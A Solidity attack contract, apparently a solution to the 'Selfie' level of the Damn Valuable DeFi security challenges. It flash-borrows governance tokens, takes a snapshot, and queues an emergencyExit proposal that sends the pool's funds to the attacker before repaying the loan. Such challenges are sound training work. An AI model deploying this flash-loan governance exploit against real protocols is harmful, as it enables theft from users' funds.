// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./ISimpleGovernance.sol";
import "./SelfiePool.sol";

contract SelfieAttacker is IERC3156FlashBorrower {

    ISimpleGovernance governance;
    address attacker;

    constructor(address _governance) {
        governance = ISimpleGovernance(_governance);
        attacker = msg.sender;
    }

    function attack(SelfiePool flashLoanPool) public {
        address token = governance.getGovernanceToken();
        // Take a flashloan to execute the attack on the `onFlashLoan` hook
        flashLoanPool.flashLoan(this, token, flashLoanPool.maxFlashLoan(token), "");
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {
        DamnValuableTokenSnapshot(token).snapshot();

        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", attacker);

        // Take advantage of all the tokens we currently have due to the flash loan
        governance.queueAction(msg.sender, 0, data);
        
        // Return the flash loan tokens, but with the malicious proposal already made
        DamnValuableTokenSnapshot(token).approve(msg.sender, amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

}
